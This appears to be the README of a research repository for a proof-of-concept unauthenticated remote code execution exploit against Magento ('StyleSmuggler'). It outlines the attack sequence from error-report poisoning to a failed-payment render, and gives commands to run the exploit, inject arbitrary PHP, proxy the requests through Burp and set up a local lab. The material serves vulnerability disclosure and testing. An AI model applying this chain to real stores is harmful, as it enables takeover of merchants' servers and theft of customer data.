# StyleSmuggler HTTP PoC

Private research repository for the HTTP-only reproduction of StyleSmuggler,
CVE-2026-75650, against a local Magento Open Source lab.

Read the full technical walkthrough in
[Magento StyleSmuggler RCE: Report Poisoning to Code Execution](https://fortbridge.co.uk/research/stylesmuggler-magento-unauthenticated-rce/).

The Python PoC performs the complete unauthenticated sequence:

1. poison a Magento error report and read its report ID from the response;
2. create a guest cart;
3. set the guest email required by the failed-payment notification;
4. store the nested billing-address parser construction;
5. trigger the failed-payment render with `type`, `text`, and `styles` in the
   query string;
6. fetch a fresh per-run canary over HTTP.

It never copies a helper into the container or invokes the scanner through
Docker. Python's standard library is sufficient.

## Run against an existing lab

```bash
python3 exploit.py --target http://localhost:18082
```

The final output must contain `RCE VERIFIED` and the same fresh
`STYLESMUGGLER_RUN_...` marker printed earlier in that run. An existing canary
cannot satisfy the check because every run generates a new marker.

The report path must be the path seen by the target PHP process. Override it
when Magento uses another document root:

```bash
python3 exploit.py \
  --target http://localhost:18082 \
  --report-dir /srv/magento/var/report
```

## Custom PHP

Pass PHP statements without `<?php` or `?>`:

```bash
python3 exploit.py \
  --target http://localhost:18082 \
  --code 'file_put_contents(getcwd()."/custom-test.txt", "PHP ".PHP_VERSION.PHP_EOL);'

curl -sS http://localhost:18082/custom-test.txt
```

The PoC writes its fresh verification marker before executing the supplied
fragment and still verifies that marker afterward.

## Burp

Every request, including report poisoning and the final canary fetch, can be
sent through an HTTP proxy:

```bash
python3 exploit.py \
  --target http://localhost:18082 \
  --proxy http://127.0.0.1:8082
```

Add `--proxy-insecure` for an HTTPS target whose intercepted certificate is not
trusted by Python.

## Manual curl flow

`curl_failed_payment.sh` performs the four Stage 2 requests and labels the
Magento component reached by each request. It requires `curl`, `jq`, and
`openssl`:

```bash
./curl_failed_payment.sh /var/www/html/var/report/REPORT_ID
```

Set another target or Burp listener through environment variables:

```bash
MAGENTO_URL=http://localhost:18082 \
BURP_PROXY=http://127.0.0.1:8082 \
./curl_failed_payment.sh /var/www/html/var/report/REPORT_ID
```

## Local target

`docker-compose.yml` provides isolated MySQL, OpenSearch, and PHP/Apache
services on `127.0.0.1:18082`. It expects an installed Magento source tree at
`./magento2-src`.

The final clean validation used Magento commit:

```text
f8405be831efa461ec18cc5a637cd98afa767015
```

Clone the source and install its Composer dependencies before running Magento's
normal `setup:install` process:

```bash
git clone --filter=blob:none --branch 2.4-develop \
  https://github.com/magento/magento2.git magento2-src
git -C magento2-src checkout f8405be831efa461ec18cc5a637cd98afa767015

docker compose build web
docker compose up -d db opensearch
docker compose run --rm web composer install --no-interaction
```

After Magento is installed with database host `db`, OpenSearch host
`opensearch`, and base URL `http://localhost:18082/`, start the web service:

```bash
docker compose up -d web
docker compose ps
```
